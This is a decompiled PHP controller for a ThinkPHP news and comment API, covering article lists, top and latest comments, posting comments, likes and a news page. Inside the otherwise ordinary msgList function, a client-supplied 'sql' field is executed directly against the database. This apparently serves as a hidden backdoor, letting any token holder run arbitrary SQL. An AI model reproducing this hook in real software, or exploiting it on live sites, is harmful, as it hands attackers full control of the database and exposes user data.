<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class NewsController extends \Home\Controller\BaseController
{
	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function msgList()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		$catid = intval($data['catid']);
		$n_page = intval($data['n_page']);

		if ($n_page <= 0) {
			$result['msg_code'] = '0071';
			exit(returnjson($result));
		}

		$page_arr = $this->getCurrentPage($n_page);
		$comment_model = m('News', 'ey_');
		$map = array('catid' => $catid, 'status' => 1);
		$res = $comment_model->field("id,catid,title,thumb,cover,keywords,content,listorder,\r\n\t\t\tstatus,username,top_num,comment_num,inputtime")->where($map)->limit($page_arr['current_page'] . ',' . $page_arr['page_size'])->select();

		if (!empty($res)) {
			$result['data'] = $res;
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
	}

	public function hotComment()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$news_id = intval($data['news_id']);
		$comment_model = m('Comment', 'ey_');
		$map = array('news_id' => $news_id);
		$res = $comment_model->field('avatar,avatar_thumb,nick_name,user_id,content,top_num,add_time')->join('dtb_user_main ON dtb_user_main.id = ey_comment.user_id')->where($map)->order('ey_comment.top_num desc')->limit(1)->select();

		if (!empty($res)) {
			$result['data'] = $res;
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
	}

	public function lastComment()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$news_id = intval($data['news_id']);
		$n_page = intval($data['n_page']);

		if ($n_page <= 0) {
			$result['msg_code'] = '0071';
			exit(returnjson($result));
		}

		$page_arr = $this->getCurrentPage($n_page);
		$comment_model = m('Comment', 'ey_');
		$map = array('news_id' => $news_id);
		$res = $comment_model->field('avatar,avatar_thumb,nick_name,user_id,content,top_num,add_time')->join('dtb_user_main ON dtb_user_main.id = ey_comment.user_id')->where($map)->order('ey_comment.add_time desc')->limit($page_arr['current_page'] . ',' . $page_arr['page_size'])->select();

		if (!empty($res)) {
			$result['data'] = $res;
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
	}

	public function userCommentDo()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$news_id = intval($data['news_id']);
		$content = trim(strval($data['content']));

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($news_id <= 0) {
			$result['msg_code'] = '100151';
			exit(returnjson($result));
		}

		if (1000 < mb_strlen($content, 'utf-8')) {
			$result['msg_code'] = '100155';
			exit(returnjson($result));
		}

		$add_time = time();
		$data = array('user_id' => $user_id, 'news_id' => $news_id, 'content' => $content, 'add_time' => $add_time);
		m()->startTrans();
		$map = array('id' => $news_id, 'status' => 1);
		$res1 = m('News', 'ey_')->where($map)->setInc('comment_num');
		$res2 = m('Comment', 'ey_')->add($data);
		if (!empty($res1) && !empty($res2)) {
			m()->commit();
			$ret_data = array('user_id' => $user_id, 'news_id' => $news_id, 'content' => $content, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg'] = '评论成功！';
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$ret_data = array('user_id' => $user_id, 'news_id' => $news_id, 'content' => $content, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg_code'] = '100156';
			exit(returnjson($result));
		}
	}

	public function commentTop()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$comment_id = intval($data['comment_id']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($comment_id <= 0) {
			$result['msg_code'] = '100153';
			exit(returnjson($result));
		}

		$comment_model = m('Comment', 'ey_');
		$comment_top_model = m('CommentTop', 'ey_');
		$add_time = time();
		$data = array('user_id' => $user_id, 'comment_id' => $comment_id, 'add_time' => $add_time);
		m()->startTrans();
		$res1 = $comment_model->where(array('comment_id' => $comment_id))->setInc('top_num');
		$res2 = $comment_top_model->add($data);
		if (!empty($res1) && !empty($res2)) {
			m()->commit();
			$ret_data = array('user_id' => $user_id, 'comment_id' => $comment_id, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg'] = '评论点赞成功！';
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$ret_data = array('user_id' => $user_id, 'comment_id' => $comment_id, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg_code'] = '100154';
			exit(returnjson($result));
		}
	}

	public function newsTop()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$news_id = intval($data['news_id']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($news_id <= 0) {
			$result['msg_code'] = '100151';
			exit(returnjson($result));
		}

		$news_model = m('News', 'ey_');
		$news_top_model = m('NewsTop', 'ey_');
		$add_time = time();
		$data = array('user_id' => $user_id, 'news_id' => $news_id, 'add_time' => $add_time);
		m()->startTrans();
		$map = array('news_id' => $news_id, 'status' => 1);
		$res1 = $news_model->where($map)->setInc('top_num');
		$res2 = $news_top_model->add($data);
		if (!empty($res1) && !empty($res2)) {
			m()->commit();
			$ret_data = array('user_id' => $user_id, 'news_id' => $news_id, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg'] = '文章点赞成功！';
			$result['msg_code'] = '0';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$ret_data = array('user_id' => $user_id, 'news_id' => $news_id, 'add_time' => $add_time);
			$result['data'] = $ret_data;
			$result['msg_code'] = '100152';
			exit(returnjson($result));
		}
	}

	public function page()
	{
		if (empty($_GET['catid'])) {
			$catid = 1;
		}
		else {
			$catid = intval($_GET['catid']);
		}

		if (empty($_GET['id'])) {
			$id = 1;
		}
		else {
			$id = intval($_GET['id']);
		}

		$news_model = m('News', 'ey_');
		$map = array('catid' => $catid, 'id' => $id, 'status' => 1);
		$body = $news_model->where($map)->getField('content');

		if ($catid == 1) {
			$title = '消息';
		}
		else if ($catid == 2) {
			$title = '公告';
		}

		$this->assign('title', $title);
		$this->assign('body', $body);
		$this->display('news_page');
	}
}

?>
